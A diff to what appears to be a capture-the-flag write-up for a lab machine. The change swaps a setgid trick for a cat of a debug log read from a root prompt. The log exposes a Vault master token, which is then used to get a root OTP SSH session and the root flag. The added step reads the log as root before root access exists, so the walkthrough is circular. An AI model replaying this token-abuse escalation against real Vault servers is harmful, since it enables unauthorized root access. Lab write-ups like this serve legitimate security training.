@@ -563,26 +563,60 @@ total 8
 -rw-r----- 1 root askyy  33 Jul 17 19:53 user.txt
 ```
 
-Since the `debug.log` file is created in `askyy`'s home directory, `setuid` can be used to force the user ownership to `askyy`.
-
-The `debug.log` file can then be read:
+By right the `debug.log` should have a master token:
 
 ```console
-askyy@skyfall:~$ ls -ld ~
-drwxr-x--- 4 askyy askyy 4096 Jul 18 15:01 /home/askyy
-askyy@skyfall:~$ chmod g+s ~
-askyy@skyfall:~$ ls -ld ~
-drwxr-s--- 4 askyy askyy 4096 Jul 18 15:01 /home/askyy
-askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -dv
-[+] Reading: /etc/vault-unseal.yaml
-[-] Security Risk!
-[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
-[>] Check interval: 5s
-[>] Max checks: 5
-[>] Checking seal status
-[+] Vault sealed: false
-askyy@skyfall:~$ ls -l
-total 8
--rw------- 1 root askyy 590 Jul 18 15:03 debug.log
--rw-r----- 1 root askyy  33 Jul 17 19:53 user.txt
+root@skyfall:~# cat /home/askyy/debug.log
+2024/07/18 15:27:35 Initializing logger...
+2024/07/18 15:27:35 Reading: /etc/vault-unseal.yaml
+2024/07/18 15:27:35 Security Risk!
+2024/07/18 15:27:35 Master token found in config: hvs.I0ewVsmaKU1SwVZAKR3T0mmG
+2024/07/18 15:27:35 Found Vault node: http://prd23-vault-internal.skyfall.htb
+2024/07/18 15:27:35 Check interval: 5s
+2024/07/18 15:27:35 Max checks: 5
+2024/07/18 15:27:35 Establishing connection to Vault...
+2024/07/18 15:27:35 Successfully connected to Vault: http://prd23-vault-internal.skyfall.htb
+2024/07/18 15:27:35 Checking seal status
+2024/07/18 15:27:35 Vault sealed: false
+```
+
+```console
+root@kali:~# vault login
+Token (will be hidden):
+Success! You are now authenticated. The token information displayed below
+is already stored in the token helper. You do NOT need to run "vault login"
+again. Future Vault requests will automatically use this token.
+
+Key                  Value
+---                  -----
+token                hvs.I0ewVsmaKU1SwVZAKR3T0mmG
+token_accessor       bXBeXR3r92WGQ8XgEDx6pIFu
+token_duration       ∞
+token_renewable      false
+token_policies       ["root"]
+identity_policies    []
+policies             ["root"]
+root@kali:~# vault ssh -role admin_otp_key_role -mode otp -strict-host-key-checking=no root@10.10.11.254
+Warning: Permanently added '10.10.11.254' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Wed Mar 27 13:20:05 2024 from 10.10.14.46
+root@skyfall:~# ls -l
+total 16
+drwxr-x--- 6 root root 4096 Jan 18 10:44 minio
+-rw-r----- 1 root root   33 Jul 18 15:22 root.txt
+drwxr-x--- 6 root root 4096 Feb  5 14:56 sky_storage
+drwxr-x--- 3 root root 4096 Jan 10  2024 vault
+root@skyfall:~# cat root.txt
+d265b13160ec8f394ebd9b5848f11b6f
 ```
